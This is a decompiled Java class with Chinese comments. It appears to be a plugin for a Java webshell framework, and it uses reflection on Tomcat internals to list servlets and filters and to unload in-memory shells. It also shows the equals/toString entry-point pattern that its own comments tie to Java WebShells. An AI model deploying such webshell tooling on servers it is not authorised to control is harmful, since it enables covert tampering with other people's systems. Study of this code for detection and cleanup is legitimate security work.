// Source code is decompiled from a .class file using FernFlower decompiler.
// Note: The linter errors about 'javax.servlet' are expected as this file is intended to be compiled with a servlet-api.jar dependency.

import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Iterator;
import javax.servlet.Servlet;
import javax.servlet.ServletContext;

/**
 * 内存马管理类，集成了Servlet和Filter的管理功能。
 * 主要用于通过反射技术操作Tomcat等Web容器中的Servlet和Filter。
 * 该类可以列出所有已注册的Servlet和Filter，并能动态卸载指定的内存马。
 * 主要通过重写 equals 和 toString 方法来传递参数和执行操作。
 */
public class MemoryShellManage {
   // Base64编码字符表
   public final char[] toBase64 = new char[]{'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'};
   
   // 用于存储从外部传入的参数，如方法名、Servlet名等。
   private HashMap parameterMap;
   // Web应用的上下文环境，是操作Servlet和Filter的入口。
   private ServletContext servletContext;

   public MemoryShellManage() {
   }

   /**
    * 重写toString()方法，作为执行并返回结果的入口点。
    * 这种设计模式常用于Java WebShell，利用了JSP表达式语言（如 ${...}）会调用toString()的特性。
    * @return 空字符串，实际结果通过修改传入的parameterMap返回。
    */
   public String toString() {
      // 执行主要逻辑
      this.parameterMap.put("result", this.run().getBytes());
      // 清理参数，防止内存泄漏
      this.parameterMap = null;
      return "";
   }

   /**
    * 重写equals()方法，用作初始化和传递参数的入口。
    * 这是一个非常规的用法，用于将外部的HashMap（包含ServletContext等）传递到当前实例中。
    * @param paramObject 包含所有必要参数的HashMap对象。
    * @return 成功返回true，失败返回false。
    */
   public boolean equals(Object paramObject) {
      try {
         this.parameterMap = (HashMap)paramObject;
         // 从参数中获取ServletContext
         this.servletContext = (ServletContext)this.parameterMap.get("servletContext");
         return true;
      } catch (Exception var3) {
         return false;
      }
   }

   /**
    * 根据传入的 "methodName" 参数，分发执行不同的操作。
    * @return 操作结果的字符串。
    */
   public String run() {
      try {
         String methodNameString = this.get("methodName");
         if (methodNameString.equals("getShellInfo")) {
            return this.getShellInfo();
         } else if (methodNameString.equals("unLoadServlet")) {
            return this.unLoadServlet();
         } else if (methodNameString.equals("unFilter")) {
            return this.unFilter();
         } else {
            return String.format("%s method not exist", methodNameString);
         }
      } catch (Exception var2) {
         return var2.getMessage();
      }
   }

   /**
    * 获取当前Web应用中所有已注册的Servlet和Filter信息。
    * 整合了getAllServlet和getAllFilter的功能。
    * @return 包含所有Servlet和Filter信息的字符串。
    */
   public String getShellInfo() {
      StringBuilder result = new StringBuilder();
      
      try {
         // 获取所有Servlet信息
         result.append("=== SERVLETS ===\n");
         result.append(this.getAllServletInfo());
         result.append("\n\n");
         
         // 获取所有Filter信息  
         result.append("=== FILTERS ===\n");
         result.append(this.getAllFilterInfo());
         
         return result.toString();
      } catch (Exception e) {
         return "Error getting shell info: " + e.getMessage();
      }
   }

   /**
    * 获取所有Servlet信息的内部方法
    * @return Servlet信息字符串
    */
   private String getAllServletInfo() {
      try {
         // 通过反射层层深入，获取Tomcat的StandardContext对象
         Object o = getFieldValue(this.servletContext, "context");
         Object standardContext = getFieldValue(o, "context");
         // 获取servletMappings，它存储了URL模式到Servlet包装器名称的映射
         HashMap servletMappings = (HashMap)getFieldValue(standardContext, "servletMappings");
         Iterator s = servletMappings.keySet().iterator();

         StringBuilder sb;
         // 遍历所有Servlet映射
         for(sb = new StringBuilder(); s.hasNext(); sb.append("\n")) {
            try {
               String url = (String)s.next();
               String wrapperName = (String)servletMappings.get(url);
               // 通过wrapperName找到对应的Wrapper对象
               Object wrapper = this.invoke(standardContext, "findChild", wrapperName);
               // 获取Servlet的完整类名并格式化输出
               sb.append(String.format("%s | %s | %s", url, wrapperName, this.invoke(wrapper, "getServletClass", (Object[])null)));
            } catch (Exception var9) {
               sb.append("Error: " + var9.getMessage());
            }
         }

         return sb.toString();
      } catch (Exception var10) {
         return "Error getting servlet info: " + var10.getMessage();
      }
   }

   /**
    * 获取所有Filter信息的内部方法
    * @return Filter信息字符串
    */
   private String getAllFilterInfo() {
      try {
         Object standardContext = this.getStandardContext();
         Object[] filterMaps = (Object[])this.invoke(standardContext, "findFilterMaps", (Object[])null);
         StringBuilder sb = new StringBuilder();

         for(int i = 0; i < filterMaps.length; ++i) {
            Object filterMap = filterMaps[i];
            sb.append(String.format("%s | %s", 
               this.getString(getFieldValue(filterMap, "filterName")), 
               this.getString(getFieldValue(filterMap, "urlPatterns"))));
            if (i < filterMaps.length - 1) {
               sb.append("\n");
            }
         }

         return sb.toString();
      } catch (Exception var6) {
         return "Error getting filter info: " + var6.getMessage();
      }
   }

   /**
    * 卸载指定的Servlet。这是移除Servlet内存马的核心功能。
    * @return "ok" 表示成功，否则返回错误信息。
    */
   public String unLoadServlet() {
      // 从参数中获取要卸载的Servlet的包装器名称和URL模式
      String wrapperName = this.get("wrapperName");
      String urlPattern = this.get("urlPattern");
      if (wrapperName != null && wrapperName.length() > 0 && urlPattern != null && urlPattern.length() > 0) {
         try {
            // 同样通过反射获取StandardContext
            Object o = getFieldValue(this.servletContext, "context");
            Field field = o.getClass().getDeclaredField("context");
            field.setAccessible(true);
            Object standardContext = getFieldValue(o, "context");
            // 找到要卸载的Servlet的Wrapper
            Object wrapper = this.invoke(standardContext, "findChild", wrapperName);
            Class containerClass = Class.forName("org.apache.catalina.Container", false, standardContext.getClass().getClassLoader());
            if (wrapper != null) {
               // 从StandardContext中移除子容器（即Servlet Wrapper）
               standardContext.getClass().getDeclaredMethod("removeChild", containerClass).invoke(standardContext, wrapper);
               // 移除URL映射
               this.invoke(standardContext, "removeServletMapping", urlPattern);
               
               // 检查是否需要更新Tomcat的Mapper，这是一个兼容性/健壮性处理
               if (this.getMethodByClass(wrapper.getClass(), "setServlet", Servlet.class) == null) {
                  this.transform(standardContext, urlPattern);
               }

               return "ok";
            } else {
               return "not find wrapper";
            }
         } catch (Exception var8) {
            return var8.getMessage();
         }
      } else {
         return "wrapperName or urlPattern is Null";
      }
   }

   /**
    * 卸载指定的Filter。这是移除Filter内存马的核心功能。
    * @return "ok" 表示成功，否则返回错误信息。
    */
   public String unFilter() {
      String filterName = this.get("filterName");
      Object standardContext = this.getStandardContext();
      ArrayList arrayList = new ArrayList();

      try {
         if (filterName != null) {
            Object[] filterMaps = (Object[])this.invoke(standardContext, "findFilterMaps", (Object[])null);
            if (filterMaps.length >= 1) {
               for(int i = 0; i < filterMaps.length; ++i) {
                  Object filterMap = filterMaps[i];
                  if (!filterName.equals(getFieldValue(filterMap, "filterName"))) {
                     arrayList.add(filterMap);
                  }
               }

               try {
                  setFieldValue(standardContext, "filterMaps", arrayList.toArray((Object[])Array.newInstance(filterMaps.getClass().getComponentType(), 0)));
               } catch (Exception var7) {
                  setFieldValue(getFieldValue(standardContext, "filterMaps"), "array", arrayList.toArray((Object[])Array.newInstance(filterMaps.getClass().getComponentType(), 0)));
               }

               return "ok";
            } else {
               return "filter number is 0";
            }
         } else {
            return "filterName not is null";
         }
      } catch (Exception var8) {
         return "e: " + var8.getMessage();
      }
   }

   /**
    * 将对象转换为字符串表示，特别处理数组类型
    * @param object 要转换的对象
    * @return 字符串表示
    */
   public String getString(Object object) {
      StringBuilder stringBuilder = new StringBuilder();
      if (object == null) {
         stringBuilder.append("null");
      } else if (object.getClass().isArray()) {
         int arrayLen = Array.getLength(object);
         stringBuilder.append("[");

         for(int i = 0; i < arrayLen; ++i) {
            stringBuilder.append(this.getString(Array.get(object, i)));
            stringBuilder.append(",");
         }

         if (stringBuilder.length() > 1) {
            stringBuilder.deleteCharAt(stringBuilder.length() - 1);
         }

         stringBuilder.append("]");
      } else {
         stringBuilder.append(object.toString());
      }

      return stringBuilder.toString();
   }

   /**
    * 获取StandardContext对象的便捷方法
    * @return StandardContext对象
    */
   private Object getStandardContext() {
      try {
         return getFieldValue(getFieldValue(this.servletContext, "context"), "context");
      } catch (Exception var2) {
         return null;
      }
   }

   /**
    * 这是一个非常关键且复杂的操作，用于在卸载Servlet后，更新Tomcat的Mapper组件。
    * Mapper组件负责将请求URL映射到正确的Servlet。如果不更新它，即使Servlet被卸载，旧的映射关系可能仍然存在，导致404错误或路由异常。
    * @param standardContext Tomcat的StandardContext对象。
    * @param path 已卸载的Servlet的URL路径。
    * @throws Exception 反射操作可能抛出异常。
    */
   private void transform(Object standardContext, String path) throws Exception {
      // 获取父容器，并找到MapperListener
      Object containerBase = this.invoke(standardContext, "getParent", (Object[])null);
      Class mapperListenerClass = Class.forName("org.apache.catalina.connector.MapperListener", false, containerBase.getClass().getClassLoader());
      Field listenersField = Class.forName("org.apache.catalina.core.ContainerBase", false, containerBase.getClass().getClassLoader()).getDeclaredField("listeners");
      listenersField.setAccessible(true);
      ArrayList listeners = (ArrayList)listenersField.get(containerBase);

      for(int i = 0; i < listeners.size(); ++i) {
         Object mapperListener_Mapper = listeners.get(i);
         if (mapperListener_Mapper != null && mapperListenerClass.isAssignableFrom(mapperListener_Mapper.getClass())) {
            // 获取Mapper对象，并遍历其内部结构
            Object mapperListener_Mapper2 = getFieldValue(mapperListener_Mapper, "mapper");
            Object mapperListener_Mapper_hosts = getFieldValue(mapperListener_Mapper2, "hosts");

            for(int j = 0; j < Array.getLength(mapperListener_Mapper_hosts); ++j) {
               Object mapperListener_Mapper_host = Array.get(mapperListener_Mapper_hosts, j);
               Object mapperListener_Mapper_hosts_contextList = getFieldValue(mapperListener_Mapper_host, "contextList");
               Object mapperListener_Mapper_hosts_contextList_contexts = getFieldValue(mapperListener_Mapper_hosts_contextList, "contexts");

               for(int k = 0; k < Array.getLength(mapperListener_Mapper_hosts_contextList_contexts); ++k) {
                  Object mapperListener_Mapper_hosts_contextList_context = Array.get(mapperListener_Mapper_hosts_contextList_contexts, k);
                  if (standardContext.equals(getFieldValue(mapperListener_Mapper_hosts_contextList_context, "object"))) {
                     // 找到与当前应用匹配的Context，并准备更新其Wrapper映射
                     new ArrayList();
                     Object standardContext_Mapper = this.invoke(standardContext, "getMapper", (Object[])null);
                     Object standardContext_Mapper_Context = getFieldValue(standardContext_Mapper, "context");
                     Object standardContext_Mapper_Context_exactWrappers = getFieldValue(standardContext_Mapper_Context, "exactWrappers");
                     Object mapperListener_Mapper_hosts_contextList_context_exactWrappers = getFieldValue(mapperListener_Mapper_hosts_contextList_context, "exactWrappers");

                     int l;
                     Object Mapper_Wrapper;
                     Method addWrapperMethod;
                     // 从Mapper中移除旧的Wrapper
                     for(l = 0; l < Array.getLength(mapperListener_Mapper_hosts_contextList_context_exactWrappers); ++l) {
                        Mapper_Wrapper = Array.get(mapperListener_Mapper_hosts_contextList_context_exactWrappers, l);
                        if (path.equals(getFieldValue(Mapper_Wrapper, "name"))) {
                           addWrapperMethod = mapperListener_Mapper2.getClass().getDeclaredMethod("removeWrapper", mapperListener_Mapper_hosts_contextList_context.getClass(), String.class);
                           addWrapperMethod.setAccessible(true);
                           addWrapperMethod.invoke(mapperListener_Mapper2, mapperListener_Mapper_hosts_contextList_context, path);
                        }
                     }

                     // 在Mapper中添加新的Wrapper信息 (如果需要)
                     // 这段逻辑看起来是用于同步, 确保mapper中的wrapper信息与context中的一致
                     for(l = 0; l < Array.getLength(standardContext_Mapper_Context_exactWrappers); ++l) {
                        Mapper_Wrapper = Array.get(standardContext_Mapper_Context_exactWrappers, l);
                        if (path.equals(getFieldValue(Mapper_Wrapper, "name"))) {
                           addWrapperMethod = mapperListener_Mapper2.getClass().getDeclaredMethod("addWrapper", mapperListener_Mapper_hosts_contextList_context.getClass(), String.class, Object.class);
                           addWrapperMethod.setAccessible(true);
                           addWrapperMethod.invoke(mapperListener_Mapper2, mapperListener_Mapper_hosts_contextList_context, path, getFieldValue(Mapper_Wrapper, "object"));
                        }
                     }
                  }
               }
            }
         }
      }
   }

   /**
    * Base64编码字符串
    * @param data 待编码的字符串
    * @return 编码后的字符串
    */
   public String base64Encode(String data) {
      return this.base64Encode(data.getBytes());
   }

   /**
    * Base64编码字节数组
    * @param src 待编码的字节数组
    * @return 编码后的字符串
    */
   public String base64Encode(byte[] src) {
      int off = 0;
      int end = src.length;
      byte[] dst = new byte[4 * ((src.length + 2) / 3)];
      int linemax = -1;
      boolean doPadding = true;
      char[] base64 = this.toBase64;
      int sp = off;
      int slen = (end - off) / 3 * 3;
      int sl = off + slen;
      if (linemax > 0 && slen > linemax / 4 * 3) {
         slen = linemax / 4 * 3;
      }

      int dp;
      int b0;
      int b1;
      for(dp = 0; sp < sl; sp = b0) {
         b0 = Math.min(sp + slen, sl);
         b1 = sp;

         int bits;
         for(int dp0 = dp; b1 < b0; dst[dp0++] = (byte)base64[bits & 63]) {
            bits = (src[b1++] & 255) << 16 | (src[b1++] & 255) << 8 | src[b1++] & 255;
            dst[dp0++] = (byte)base64[bits >>> 18 & 63];
            dst[dp0++] = (byte)base64[bits >>> 12 & 63];
            dst[dp0++] = (byte)base64[bits >>> 6 & 63];
         }

         b1 = (b0 - sp) / 3 * 4;
         dp += b1;
      }

      if (sp < end) {
         b0 = src[sp++] & 255;
         dst[dp++] = (byte)base64[b0 >> 2];
         if (sp == end) {
            dst[dp++] = (byte)base64[b0 << 4 & 63];
            if (doPadding) {
               dst[dp++] = 61;
               dst[dp++] = 61;
            }
         } else {
            b1 = src[sp++] & 255;
            dst[dp++] = (byte)base64[b0 << 4 & 63 | b1 >> 4];
            dst[dp++] = (byte)base64[b1 << 2 & 63];
            if (doPadding) {
               dst[dp++] = 61;
            }
         }
      }

      return new String(dst);
   }

   /**
    * 反射工具：设置指定对象的字段值。
    * @param obj 目标对象。
    * @param fieldName 字段名。
    * @param value 要设置的值。
    * @throws Exception 反射操作可能抛出异常。
    */
   public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
      Field f = null;
      if (obj instanceof Field) {
         f = (Field)obj;
      } else {
         f = obj.getClass().getDeclaredField(fieldName);
      }

      f.setAccessible(true);
      f.set(obj, value);
   }

   /**
    * 反射工具：调用指定对象的方法。
    * @param obj 目标对象。
    * @param methodName 方法名。
    * @param parameters 方法参数。
    * @return 方法调用结果。
    */
   private Object invoke(Object obj, String methodName, Object... parameters) {
      try {
         ArrayList classes = new ArrayList();
         if (parameters != null) {
            for(int i = 0; i < parameters.length; ++i) {
               Object o1 = parameters[i];
               if (o1 != null) {
                  classes.add(o1.getClass());
               } else {
                  classes.add((Object)null);
               }
            }
         }

         Method method = this.getMethodByClass(obj.getClass(), methodName, (Class[])classes.toArray(new Class[0]));
         return method.invoke(obj, parameters);
      } catch (Exception var7) {
         return null;
      }
   }

   /**
    * 反射工具：根据方法名和参数类型，从指定类及其父类中查找方法。
    * @param cs 目标类。
    * @param methodName 方法名。
    * @param parameters 参数类型数组。
    * @return 找到的Method对象，或null。
    */
   private Method getMethodByClass(Class cs, String methodName, Class... parameters) {
      Method method = null;

      while(cs != null) {
         try {
            method = cs.getDeclaredMethod(methodName, parameters);
            cs = null;
         } catch (Exception var6) {
            cs = cs.getSuperclass();
         }
      }

      return method;
   }

   /**
    * 反射工具：获取指定对象的字段值。
    * @param obj 目标对象。
    * @param fieldName 字段名。
    * @return 字段的值。
    * @throws Exception 反射操作可能抛出异常。
    */
   public static Object getFieldValue(Object obj, String fieldName) throws Exception {
      Field f = null;
      if (obj instanceof Field) {
         f = (Field)obj;
      } else {
         Method method = null;
         Class cs = obj.getClass();

         while(cs != null) {
            try {
               f = cs.getDeclaredField(fieldName);
               cs = null;
            } catch (Exception var6) {
               cs = cs.getSuperclass();
            }
         }
      }

      f.setAccessible(true);
      return f.get(obj);
   }

   /**
    * 从参数Map中获取字符串类型的值。
    * @param key 键。
    * @return 对应的值，或null。
    */
   public String get(String key) {
      try {
         return new String((byte[])this.parameterMap.get(key));
      } catch (Exception var3) {
         return null;
      }
   }

   /**
    * 从参数Map中获取字节数组类型的值。
    * @param key 键。
    * @return 对应的值，或null。
    */
   public byte[] getByteArray(String key) {
      try {
         return (byte[])this.parameterMap.get(key);
      } catch (Exception var3) {
         return null;
      }
   }
}